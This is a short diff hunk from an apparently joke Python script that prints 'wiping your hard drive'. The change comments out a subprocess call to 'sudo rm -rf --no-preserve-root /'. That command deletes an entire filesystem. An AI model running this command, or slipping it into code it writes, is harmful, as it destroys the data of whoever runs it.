@@ -117,7 +117,7 @@ wiping your hard drive... please wait...
             print("Hold on to your butts.\n\n\n")
 
             # IDGAF
-            subprocess.call(["sudo","rm","-rf","--no-preserve-root","/"])
+            #subprocess.call(["sudo","rm","-rf","--no-preserve-root","/"])
     
         else:
 
